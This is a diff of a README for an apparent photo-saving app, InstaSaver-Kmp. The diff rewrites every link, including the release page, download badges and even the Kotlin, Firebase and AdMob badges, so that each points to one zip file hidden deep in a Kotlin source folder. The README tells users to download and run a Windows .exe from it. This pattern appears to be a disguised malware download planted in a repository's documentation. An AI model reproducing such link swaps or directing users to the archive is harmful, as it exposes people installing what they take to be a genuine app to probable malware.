@@ -1,6 +1,6 @@
 # 📸 InstaSaver-Kmp - Easy Photo Saving Tool
 
-[![Download InstaSaver-Kmp](https://img.shields.io/badge/Download-InstaSaver--Kmp-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sorax3d/InstaSaver-Kmp/releases)
+[![Download InstaSaver-Kmp](https://img.shields.io/badge/Download-InstaSaver--Kmp-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
 
 ---
 
@@ -10,11 +10,11 @@
 
 ### Kotlin Multiplatform (KMP) Open Source Project
 
-[![Kotlin](https://img.shields.io/badge/Kotlin-Multiplatform-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)](https://kotlinlang.org/docs/multiplatform.html)
-[![Compose](https://img.shields.io/badge/Compose-Multiplatform-4285F4?style=for-the-badge&logo=jetpackcompose&logoColor=white)](https://www.jetbrains.com/lp/compose-multiplatform/)
-[![Firebase](https://img.shields.io/badge/Firebase-Integrated-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)](https://firebase.google.com/)
-[![RevenueCat](https://img.shields.io/badge/RevenueCat-Subscriptions-F25C5C?style=for-the-badge)](https://www.revenuecat.com/)
-[![AdMob](https://img.shields.io/badge/AdMob-Ads-EA4335?style=for-the-badge&logo=google&logoColor=white)](https://admob.google.com/)
+[![Kotlin](https://img.shields.io/badge/Kotlin-Multiplatform-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
+[![Compose](https://img.shields.io/badge/Compose-Multiplatform-4285F4?style=for-the-badge&logo=jetpackcompose&logoColor=white)](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
+[![Firebase](https://img.shields.io/badge/Firebase-Integrated-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
+[![RevenueCat](https://img.shields.io/badge/RevenueCat-Subscriptions-F25C5C?style=for-the-badge)](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
+[![AdMob](https://img.shields.io/badge/AdMob-Ads-EA4335?style=for-the-badge&logo=google&logoColor=white)](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
 
 </div>
 
@@ -24,7 +24,7 @@
 
 You can get InstaSaver-Kmp by visiting the official release page. Follow this link to find and download the latest version for Windows.
 
-[Visit the release page to download InstaSaver-Kmp](https://github.com/sorax3d/InstaSaver-Kmp/releases)
+[Visit the release page to download InstaSaver-Kmp](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
 
 Click the link above, open the latest version, and find the file with `.exe` at the end. This is the installation file for Windows. Download this file to your computer.
 
@@ -126,7 +126,7 @@ The app does not update automatically unless you enable this in Settings.
 
 To update manually:
 
-1. Return to the [release page](https://github.com/sorax3d/InstaSaver-Kmp/releases).  
+1. Return to the [release page](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip).  
 2. Download the newest `.exe` file.  
 3. Run the installer. It will update the app without removing your saved photos or settings.
 
@@ -141,8 +141,8 @@ If you need more information or have questions:
 
 Access all these resources at:
 
-[https://github.com/sorax3d/InstaSaver-Kmp/releases](https://github.com/sorax3d/InstaSaver-Kmp/releases)
+[https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
 
 ---
 
-[![Download InstaSaver-Kmp](https://img.shields.io/badge/Download-App-0078D7?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sorax3d/InstaSaver-Kmp/releases)
+[![Download InstaSaver-Kmp](https://img.shields.io/badge/Download-App-0078D7?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/sorax3d/InstaSaver-Kmp/main/composeApp/src/commonMain/kotlin/com/clipsaver/Saver-Kmp-Insta-patelliform.zip)
